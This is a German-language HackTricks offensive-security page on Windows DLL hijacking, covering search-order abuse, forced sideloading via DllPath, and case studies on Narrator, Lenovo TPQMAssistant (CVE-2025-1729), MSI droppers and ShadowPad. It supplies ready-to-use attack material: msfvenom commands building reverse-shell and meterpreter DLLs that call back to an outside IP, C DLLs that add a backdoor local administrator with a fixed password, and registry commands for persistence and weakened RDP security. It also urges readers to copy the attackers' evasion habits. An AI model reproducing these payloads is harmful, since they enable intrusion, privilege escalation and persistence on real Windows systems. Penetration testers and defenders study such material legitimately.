# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking beinhaltet, eine vertrauenswürdige Anwendung dazu zu bringen, eine bösartige DLL zu laden. Dieser Begriff umfasst mehrere Taktiken wie **DLL Spoofing, Injection, and Side-Loading**. Er wird hauptsächlich für Codeausführung, Persistenz und seltener für Privilegieneskalation genutzt. Obwohl hier der Fokus auf Eskalation liegt, bleibt die Methode des Hijackings über die Ziele hinweg gleich.

### Common Techniques

Mehrere Methoden werden für DLL hijacking verwendet, deren Effektivität vom DLL-Ladeverhalten der Anwendung abhängt:

1. **DLL Replacement**: Ersetzen einer echten DLL durch eine bösartige, optional unter Verwendung von DLL Proxying, um die ursprüngliche Funktionalität zu erhalten.
2. **DLL Search Order Hijacking**: Platzieren der bösartigen DLL in einem Suchpfad vor der legitimen DLL, ausnutzend das Suchmuster der Anwendung.
3. **Phantom DLL Hijacking**: Erstellen einer bösartigen DLL, die eine Anwendung lädt, weil sie denkt, es handle sich um eine erforderliche, nicht vorhandene DLL.
4. **DLL Redirection**: Ändern von Suchparametern wie %PATH% oder .exe.manifest / .exe.local Dateien, um die Anwendung auf die bösartige DLL zu lenken.
5. **WinSxS DLL Replacement**: Ersetzen der legitimen DLL durch eine bösartige Version im WinSxS-Verzeichnis, eine Methode, die oft mit DLL side-loading assoziiert wird.
6. **Relative Path DLL Hijacking**: Platzieren der bösartigen DLL in einem vom Benutzer kontrollierten Verzeichnis zusammen mit der kopierten Anwendung, ähnlich zu Binary Proxy Execution-Techniken.

> [!TIP]
> Für eine Schritt-für-Schritt-Kette, die HTML-Staging, AES-CTR-Konfigurationen und .NET-Implants auf DLL sideloading schichtet, siehe den untenstehenden Workflow.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

Die gebräuchlichste Methode, um fehlende DLLs in einem System zu finden, ist das Ausführen von [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) von sysinternals und das **Setzen** der **folgenden 2 Filter**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

und anschließend nur die **File System Activity** anzeigen:

![](<../../../images/image (153).png>)

Wenn du allgemein nach **missing dlls** suchst, lässt du das für einige **Sekunden** laufen.\
Wenn du nach einer **missing dll** in einem bestimmten Executable suchst, solltest du **einen weiteren Filter wie "Process Name" "contains" `<exec name>` setzen, es ausführen und das Erfassen der Events stoppen**.

## Exploiting Missing Dlls

Um Privilegien zu eskalieren, ist die beste Chance, eine **DLL zu schreiben, die ein privilegierter Prozess zu laden versuchen wird**, in einem der **Orte, an denen sie gesucht wird**. Daher können wir entweder eine DLL in einen **Ordner schreiben**, in dem die DLL **vor** dem Ordner gesucht wird, der die **originale DLL** enthält (seltener Fall), oder wir können in einen Ordner schreiben, in dem die DLL gesucht wird, während die originale **DLL nirgendwo vorhanden** ist.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Windows-Anwendungen suchen DLLs, indem sie eine Reihe vordefinierter Suchpfade in einer bestimmten Reihenfolge durchlaufen. Das Problem des DLL hijackings entsteht, wenn eine schädliche DLL strategisch in einem dieser Verzeichnisse platziert wird, sodass sie vor der authentischen DLL geladen wird. Eine Lösung, dies zu verhindern, besteht darin, sicherzustellen, dass die Anwendung absolute Pfade verwendet, wenn sie auf die benötigten DLLs verweist.

Du kannst die **DLL search order on 32-bit** Systemen unten sehen:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Das ist die **default** Suchreihenfolge mit **SafeDllSearchMode** aktiviert. Wenn es deaktiviert ist, rückt das aktuelle Verzeichnis auf den zweiten Platz. Um diese Funktion zu deaktivieren, erstelle den Registry-Wert **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** und setze ihn auf 0 (standardmäßig ist er aktiviert).

Wenn die [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) Funktion mit **LOAD_WITH_ALTERED_SEARCH_PATH** aufgerufen wird, beginnt die Suche im Verzeichnis des ausführbaren Moduls, das **LoadLibraryEx** lädt.

Beachte schließlich, dass **eine dll durch Angabe des absoluten Pfads statt nur des Namens geladen werden kann**. In diesem Fall wird diese dll **nur in diesem Pfad** gesucht (wenn die dll Abhängigkeiten hat, werden diese so gesucht, als wären sie gerade nur nach Namen geladen worden).

Es gibt weitere Möglichkeiten, die Suchreihenfolge zu verändern, die ich hier nicht erklären werde.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Eine fortgeschrittene Möglichkeit, den DLL-Suchpfad eines neu erstellten Prozesses deterministisch zu beeinflussen, ist das Setzen des DllPath-Feldes in RTL_USER_PROCESS_PARAMETERS beim Erstellen des Prozesses mit den nativen ntdll-APIs. Indem man hier ein vom Angreifer kontrolliertes Verzeichnis angibt, kann ein Zielprozess, der eine importierte DLL nach Namen auflöst (kein absoluter Pfad und keine sicheren Ladeflags), gezwungen werden, eine bösartige DLL aus diesem Verzeichnis zu laden.

Key idea
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Notes/limitations
- This affects the child process being created; it is different from SetDllDirectory, which affects the current process only.
- The target must import or LoadLibrary a DLL by name (no absolute path and not using LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs and hardcoded absolute paths cannot be hijacked. Forwarded exports and SxS may change precedence.

Minimales C-Beispiel (ntdll, wide strings, vereinfachte Fehlerbehandlung):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Betriebsbeispiel
- Platziere eine bösartige xmllite.dll (die die erforderlichen Funktionen exportiert oder als Proxy für die echte DLL fungiert) in deinem DllPath-Verzeichnis.
- Starte ein signiertes Binary, von dem bekannt ist, dass es xmllite.dll per Name mit der obigen Technik sucht. Der Loader löst den Import über den angegebenen DllPath auf und sideloads deine DLL.

Diese Technik wurde in-the-wild beobachtet, um mehrstufige Sideloading-Ketten zu betreiben: Ein initialer Launcher legt eine Hilfs-DLL ab, die dann ein von Microsoft signiertes, hijackable Binary mit einem benutzerdefinierten DllPath startet, um das Laden der DLL des Angreifers aus einem Staging-Verzeichnis zu erzwingen.


#### Ausnahmen bei der DLL-Suchreihenfolge laut Windows-Dokumentation

Bestimmte Ausnahmen von der standardmäßigen DLL-Suchreihenfolge werden in der Windows-Dokumentation erwähnt:

- Wenn eine **DLL, die denselben Namen wie eine bereits im Speicher geladene DLL trägt**, angetroffen wird, umgeht das System die übliche Suche. Stattdessen führt es eine Prüfung auf Umleitung und ein Manifest durch, bevor es auf die bereits im Speicher befindliche DLL zurückgreift. **In diesem Szenario führt das System keine Suche nach der DLL durch**.
- In Fällen, in denen die DLL als eine **known DLL** für die aktuelle Windows-Version erkannt wird, verwendet das System seine Version der known DLL sowie alle ihre abhängigen DLLs und **verzichtet auf den Suchprozess**. Der Registry-Schlüssel **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** enthält eine Liste dieser known DLLs.
- Falls eine **DLL Abhängigkeiten hat**, wird die Suche nach diesen abhängigen DLLs so durchgeführt, als wären sie nur durch ihre **Modulnamen** angegeben, unabhängig davon, ob die ursprüngliche DLL über einen vollständigen Pfad identifiziert wurde.

### Privilegien eskalieren

**Voraussetzungen**:

- Identifiziere einen Prozess, der unter **anderen Privilegien** (horizontal or lateral movement) läuft oder laufen wird und dem **eine DLL fehlt**.
- Stelle sicher, dass für ein **Verzeichnis**, in dem nach der **DLL** gesucht wird, **Schreibzugriff** vorhanden ist. Dieser Ort kann das Verzeichnis des Executables oder ein Verzeichnis im Systempfad sein.

Ja, die Voraussetzungen sind schwer zu finden, da es **standardmäßig ziemlich ungewöhnlich ist, ein privilegiertes ausführbares Programm zu finden, dem eine DLL fehlt** und es noch **ungewöhnlicher ist, Schreibrechte in einem Ordner des Systempfads zu haben** (standardmäßig hat man das nicht). Aber in falsch konfigurierten Umgebungen ist das möglich.\
Falls du Glück hast und die Voraussetzungen erfüllst, kannst du dir das [UACME](https://github.com/hfiref0x/UACME) Projekt ansehen. Auch wenn das **Hauptziel des Projekts das Umgehen von UAC ist**, findest du dort möglicherweise einen **PoC** für Dll hijacking für die Windows-Version, den du verwenden kannst (wahrscheinlich reicht es, den Pfad des Ordners zu ändern, in dem du Schreibrechte hast).

Beachte, dass du deine **Berechtigungen in einem Ordner prüfen kannst**, indem du:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Und **prüfe die Berechtigungen aller Ordner im PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Du kannst auch die imports einer ausführbaren Datei und die exports einer dll mit folgendem prüfen:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Für eine vollständige Anleitung, wie man **Dll Hijacking missbraucht, um Privilegien zu eskalieren** mit Berechtigungen zum Schreiben in einem **System Path folder** siehe:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automatisierte Tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) prüft, ob du Schreibberechtigungen für einen Ordner im system PATH hast.\
Weitere interessante automatisierte Tools, um diese Schwachstelle zu entdecken, sind **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ und _Write-HijackDll._

### Beispiel

Falls du ein ausnutzbares Szenario findest, ist eine der wichtigsten Voraussetzungen für eine erfolgreiche Ausnutzung, eine dll zu erstellen, die mindestens alle Funktionen exportiert, die das ausführbare Programm von ihr importieren wird. Beachte außerdem, dass Dll Hijacking praktisch ist, um [vom Medium Integrity level auf High zu eskalieren **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) oder von[ **High Integrity zu SYSTEM**](../index.html#from-high-integrity-to-system)**.** Ein Beispiel, **wie man eine gültige dll erstellt**, findest du in dieser Studie zum dll hijacking, die sich auf dll hijacking zur Ausführung konzentriert: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Außerdem findest du im nächsten Abschnitt einige **einfache dll-Codes**, die als **Vorlagen** nützlich sein können oder um eine **dll zu erstellen, die nicht benötigte Funktionen exportiert**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Im Grunde ist ein **Dll proxy** eine Dll, die in der Lage ist, **deinen bösartigen Code beim Laden auszuführen**, aber auch die erwartete Funktionalität zu **expose**n und **work**en, indem sie **alle Aufrufe an die reale Bibliothek weiterleitet**.

Mit dem Tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) oder [**Spartacus**](https://github.com/Accenture/Spartacus) kannst du tatsächlich **eine ausführbare Datei angeben und die Bibliothek auswählen**, die du proxify möchtest, und **eine proxified dll generieren** oder **die Dll angeben** und **eine proxified dll generieren**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Einen meterpreter (x86) bekommen:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Benutzer erstellen (x86, ich habe keine x64-Version gesehen):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Eigenes

Beachte, dass in mehreren Fällen die Dll, die du kompilierst, mehrere Funktionen **exportieren muss**, die vom Opferprozess geladen werden; existieren diese Funktionen nicht, kann die **binary** sie nicht laden und der **exploit** wird fehlschlagen.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL-Beispiel mit Benutzererstellung</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternative C-DLL mit Thread-Einstiegspunkt</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Fallstudie: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe überprüft beim Start weiterhin eine vorhersehbare, sprachspezifische Localization-DLL, die für arbitrary code execution und persistence hijacked werden kann.

Wichtige Fakten
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Wenn eine vom Angreifer beschreibbare DLL am OneCore-Pfad existiert, wird sie geladen und `DllMain(DLL_PROCESS_ATTACH)` ausgeführt. Es werden keine Exporte benötigt.

Erkennung mit Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Starten Sie Narrator und beobachten Sie den versuchten Ladevorgang des oben genannten Pfads.

Minimale DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- Benutzerkontext (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Mit dem Obigen lädt das Starten von Narrator die platzierte DLL. Auf dem sicheren Desktop (Anmeldebildschirm) drücke CTRL+WIN+ENTER, um Narrator zu starten.

RDP-triggered SYSTEM execution (lateral movement)
- Erlaube die klassische RDP-Sicherheitsschicht: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Per RDP auf den Host verbinden, auf dem Anmeldebildschirm CTRL+WIN+ENTER drücken, um Narrator zu starten; deine DLL wird als SYSTEM auf dem secure desktop ausgeführt.
- Die Ausführung endet, wenn die RDP-Sitzung schließt — inject/migrate daher zügig.

Bring Your Own Accessibility (BYOA)
- Du kannst einen eingebauten Accessibility Tool (AT)-Registry-Eintrag (z. B. CursorIndicator) klonen, ihn so bearbeiten, dass er auf eine beliebige Binary/DLL zeigt, ihn importieren und dann `configuration` auf diesen AT-Namen setzen. Dadurch wird beliebige Ausführung über das Accessibility-Framework proxied.

Notes
- Schreiben unter `%windir%\System32` und das Ändern von HKLM-Werten benötigt Administratorrechte.
- Die gesamte Payload-Logik kann in `DLL_PROCESS_ATTACH` leben; keine Exports sind nötig.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Dieser Fall demonstriert **Phantom DLL Hijacking** im TrackPoint Quick Menu von Lenovo (`TPQMAssistant.exe`), erfasst als **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

Ein Angreifer kannStub eine bösartige `hostfxr.dll` im selben Verzeichnis ablegen und die fehlende DLL ausnutzen, um Codeausführung im Kontext des Benutzers zu erreichen:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Angriffsablauf

1. Als Standardbenutzer die Datei `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\` ablegen.
2. Warten, bis die geplante Aufgabe um 9:30 Uhr im Kontext des aktuellen Benutzers ausgeführt wird.
3. Wenn ein Administrator angemeldet ist, wenn die Aufgabe ausgeführt wird, läuft die bösartige DLL in der Sitzung des Administrators mit medium integrity.
4. Standardmäßige UAC bypass-Techniken verketten, um von medium integrity auf SYSTEM-Privilegien zu eskalieren.

## Fallstudie: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Angreifer kombinieren häufig MSI-basierte Dropper mit DLL side-loading, um payloads unter einem vertrauenswürdigen, signierten Prozess auszuführen.

Ablaufübersicht
- Der Benutzer lädt das MSI herunter. Eine CustomAction läuft still während der GUI-Installation (z. B. LaunchApplication oder eine VBScript action) und rekonstruiert die nächste Stufe aus eingebetteten Ressourcen.
- Der Dropper schreibt eine legitime, signierte EXE und eine bösartige DLL in dasselbe Verzeichnis (example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Wenn die signierte EXE gestartet wird, lädt die Windows DLL-Suchreihenfolge wsc.dll zuerst aus dem Arbeitsverzeichnis und führt attacker code unter einem signierten Parent aus (ATT&CK T1574.001).

MSI-Analyse (woran man achten sollte)
- CustomAction-Tabelle:
- Suche nach Einträgen, die ausführbare Dateien oder VBScript ausführen. Beispiel für ein verdächtiges Muster: LaunchApplication, das eine eingebettete Datei im Hintergrund ausführt.
- In Orca (Microsoft Orca.exe) die CustomAction-, InstallExecuteSequence- und Binary-Tabellen untersuchen.
- Eingebettete/aufgeteilte payloads im MSI-CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Suche nach mehreren kleinen Fragmenten, die von einer VBScript CustomAction zusammengefügt und entschlüsselt werden. Üblicher Ablauf:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Lege diese zwei Dateien in denselben Ordner:
- wsc_proxy.exe: legitimer signierter Host (Avast). Der Prozess versucht, wsc.dll anhand des Namens aus seinem Verzeichnis zu laden.
- wsc.dll: attacker DLL. Wenn keine spezifischen exports erforderlich sind, kann DllMain ausreichen; andernfalls erstelle eine proxy DLL und leite die benötigten exports an die genuine library weiter, während das payload in DllMain ausgeführt wird.
- Erstelle ein minimales DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Für Exportanforderungen verwenden Sie ein Proxy-Framework (z. B. DLLirant/Spartacus), um eine weiterleitende DLL zu erzeugen, die außerdem Ihren Payload ausführt.

- Diese Technik beruht auf der DLL-Namensauflösung durch das Host-Binary. Wenn das Host-Binary absolute Pfade oder sichere Ladeflags verwendet (z. B. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), kann das Hijack fehlschlagen.
- KnownDLLs, SxS und forwarded exports können die Priorität beeinflussen und müssen bei der Auswahl des Host-Binarys und des Export-Sets berücksichtigt werden.

## Signierte Triaden + verschlüsselte payloads (ShadowPad-Fallstudie)

Check Point beschrieb, wie Ink Dragon ShadowPad mit einer **dreiteiligen Triade** einsetzt, um sich in legitime Software einzufügen, während das Kern-payload auf der Festplatte verschlüsselt bleibt:

1. **Signierte Host-EXE** – Anbieter wie AMD, Realtek oder NVIDIA werden missbraucht (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Die Angreifer benennen die ausführbare Datei so um, dass sie wie eine Windows-Binärdatei aussieht (zum Beispiel `conhost.exe`), aber die Authenticode-Signatur bleibt gültig.
2. **Bösartige Loader-DLL** – neben der EXE mit einem erwarteten Namen abgelegt (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Die DLL ist normalerweise eine MFC-Binärdatei, die mit dem ScatterBrain-Framework obfuskiert ist; ihre einzige Aufgabe ist es, das verschlüsselte Blob zu finden, zu entschlüsseln und ShadowPad reflektiv zu mappen.
3. **Verschlüsseltes payload-Blob** – wird oft als `<name>.tmp` im selben Verzeichnis abgelegt. Nachdem der entschlüsselte Payload in den Speicher gemappt wurde, löscht der Loader die TMP-Datei, um forensische Spuren zu vernichten.

Tradecraft-Hinweise:

* Durch das Umbenennen der signierten EXE (während der ursprüngliche `OriginalFileName` im PE-Header erhalten bleibt) kann sie sich als Windows-Binärdatei tarnen und trotzdem die Herstellersignatur behalten. Replizieren Sie daher Ink Dragons Gewohnheit, `conhost.exe`-ähnliche Binärdateien abzulegen, die tatsächlich AMD/NVIDIA-Dienstprogramme sind.
* Da die ausführbare Datei als vertrauenswürdig gilt, müssen die meisten Allowlisting-Kontrollen nur Ihre bösartige DLL neben ihr zulassen. Konzentrieren Sie sich darauf, die Loader-DLL anzupassen; das signierte Parent kann normalerweise unverändert ausgeführt werden.
* ShadowPad’s decryptor erwartet, dass das TMP-Blob neben dem Loader liegt und beschreibbar ist, damit es die Datei nach dem Mapping nullen kann. Halten Sie das Verzeichnis beschreibbar, bis der Payload geladen ist; sobald er im Speicher ist, kann die TMP-Datei aus OPSEC-Gründen sicher gelöscht werden.

## Referenzen

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)


{{#include ../../../banners/hacktricks-training.md}}
